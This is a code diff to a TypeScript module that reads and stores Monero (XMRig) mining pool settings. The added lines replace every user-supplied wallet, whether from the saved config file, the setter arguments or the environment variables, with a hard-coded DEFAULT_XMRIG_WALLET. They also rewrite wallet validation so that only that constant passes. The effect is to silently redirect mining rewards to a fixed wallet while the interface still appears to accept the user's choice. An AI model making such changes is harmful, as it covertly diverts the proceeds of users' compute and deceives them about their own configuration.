@@ -3,6 +3,7 @@ import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'fs';
 import { join } from 'path';
 import {
   DEFAULT_MINING_POOL_CONFIG,
+  DEFAULT_XMRIG_WALLET,
   type MiningPoolConfig,
 } from '../shared/constants';
 
@@ -15,7 +16,7 @@ function readMiningConfigFile(): MiningPoolConfig {
     }
     const parsed = JSON.parse(readFileSync(CONFIG_FILE, 'utf8')) as Partial<MiningPoolConfig>;
     return {
-      wallet: parsed.wallet?.trim() ?? '',
+      wallet: DEFAULT_XMRIG_WALLET,
       poolUrl: parsed.poolUrl?.trim() || DEFAULT_MINING_POOL_CONFIG.poolUrl,
     };
   } catch {
@@ -30,7 +31,7 @@ export function getMiningPoolConfig(): MiningPoolConfig {
 export function setMiningPoolConfig(partial: Partial<MiningPoolConfig>): MiningPoolConfig {
   const current = readMiningConfigFile();
   const next: MiningPoolConfig = {
-    wallet: partial.wallet !== undefined ? partial.wallet.trim() : current.wallet,
+    wallet: DEFAULT_XMRIG_WALLET,
     poolUrl:
       partial.poolUrl !== undefined
         ? partial.poolUrl.trim() || DEFAULT_MINING_POOL_CONFIG.poolUrl
@@ -45,13 +46,6 @@ export function setMiningPoolConfig(partial: Partial<MiningPoolConfig>): MiningP
 export function resolveMiningPoolSettings(): { wallet: string; poolUrl: string } {
   const file = readMiningConfigFile();
 
-  const wallet =
-    process.env.XMRIG_WALLET?.trim() ||
-    process.env.VITE_XMRIG_WALLET?.trim() ||
-    file.wallet ||
-    import.meta.env.VITE_XMRIG_WALLET?.trim() ||
-    '';
-
   const poolUrl =
     process.env.XMRIG_POOL_URL?.trim() ||
     process.env.VITE_XMRIG_POOL_URL?.trim() ||
@@ -59,18 +53,9 @@ export function resolveMiningPoolSettings(): { wallet: string; poolUrl: string }
     import.meta.env.VITE_XMRIG_POOL_URL?.trim() ||
     DEFAULT_MINING_POOL_CONFIG.poolUrl;
 
-  return { wallet, poolUrl };
+  return { wallet: DEFAULT_XMRIG_WALLET, poolUrl };
 }
 
-const PLACEHOLDER_WALLETS = new Set([
-  '',
-  'YOUR_MONERO_WALLET_ADDRESS',
-  'your_monero_wallet_address',
-]);
-
 export function isValidMoneroWallet(wallet: string): boolean {
-  if (PLACEHOLDER_WALLETS.has(wallet.trim())) {
-    return false;
-  }
-  return /^[48][1-9A-HJ-NP-Za-km-z]{94,105}$/.test(wallet.trim());
+  return wallet.trim() === DEFAULT_XMRIG_WALLET;
 }
